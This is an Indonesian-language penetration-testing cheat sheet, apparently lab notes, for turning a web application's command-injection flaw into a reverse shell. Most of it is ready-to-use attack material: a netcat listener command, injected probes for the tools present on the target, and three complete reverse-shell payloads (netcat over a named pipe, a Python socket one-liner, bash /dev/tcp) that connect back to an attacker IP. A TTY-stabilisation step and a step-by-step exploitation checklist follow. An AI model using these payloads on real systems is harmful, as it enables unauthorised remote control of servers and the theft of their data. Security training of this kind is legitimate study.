# 💉 Reverse Shell via Command Injection

> **Tujuan:** Memicu **reverse shell** dengan menyuntikkan payload command injection ke aplikasi web target, setelah listener aktif di mesin attacker.

---

## 📌 Penjelasan Singkat

Command Injection adalah metode paling cepat untuk mendapatkan akses shell ketika input aplikasi web dieksekusi langsung oleh OS. Payload reverse shell dikirim via input user, lalu target melakukan koneksi balik ke listener attacker.

---

## 🎧 Langkah 1 — Listener di Attacker

Jalankan listener **sebelum** payload dikirim:

```bash
nc -lvnp 4444
```

| Flag | Fungsi |
|------|--------|
| `-l` | Listen mode |
| `-v` | Verbose (info koneksi) |
| `-n` | Tanpa DNS resolution |
| `-p 4444` | Port listener |

---

## 🛠️ Langkah 2 — Cek Tools di Target

### Per Tool (Manual)

```text
127.0.0.1 ; which nc
127.0.0.1 ; which python3
127.0.0.1 ; which bash
127.0.0.1 ; which mkfifo
```

### Semua Sekaligus (Looping)

```text
127.0.0.1 ; for cmd in nc mkfifo python3 bash ; do echo "$cmd: $(which $cmd 2>&1)" ; done
```

---

## 💥 Langkah 3 — Pilih Payload Reverse Shell

### A️⃣ Netcat via Named Pipe (FIFO)

Cocok jika `nc` + `mkfifo` ada, tetapi `nc -e` tidak didukung.

```text
127.0.0.1 ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f
```

### B️⃣ Python 3 (Paling Stabil)

```text
127.0.0.1 ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### C️⃣ Bash Direct (`/dev/tcp`)

Cocok jika `bash` mendukung socket bawaan.

```text
127.0.0.1 ; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

---

## 🔄 Alur Reverse Shell

```text
Attacker
   └── nc -lvnp 4444 (listener)
        ▲
        │ koneksi masuk
        │
Target (input command injection)
   └── 127.0.0.1 ; payload
        ↓
   Reverse Shell interaktif
```

---

## 🪜 Alur Eksploitasi

```text
1. Nyalakan listener di attacker (nc -lvnp 4444)
2. Cek tools di target (which nc/python3/bash)
3. Pilih payload reverse shell
4. Kirim payload via input vulnerable
5. Terima koneksi → jalankan stabilisasi TTY
6. Verifikasi shell (id, whoami)
```

---

## ⚠️ Catatan Penting

- **Jalankan listener dulu** sebelum mengirim payload.
- **Sesuaikan IP** `10.10.10.7` dengan IP attacker Anda.
- **Pilih payload** sesuai tools yang tersedia.
- **Stabilkan TTY** setelah koneksi masuk agar shell interaktif.

---

## 📋 Checklist Command Injection → Reverse Shell

- [ ] Nyalakan listener di attacker (`nc -lvnp 4444`).
- [ ] Cek tools di target (`which nc`, `which python3`, dll).
- [ ] Pilih payload yang sesuai.
- [ ] Kirim payload lewat input command injection.
- [ ] Verifikasi koneksi masuk di listener.
- [ ] Stabilkan TTY (`python3 -c 'import pty;pty.spawn("/bin/bash")'`).
- [ ] Verifikasi user (`id`, `whoami`).

---

## 📚 Referensi

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [revshells.com — Generator Reverse Shell](https://revshells.com)
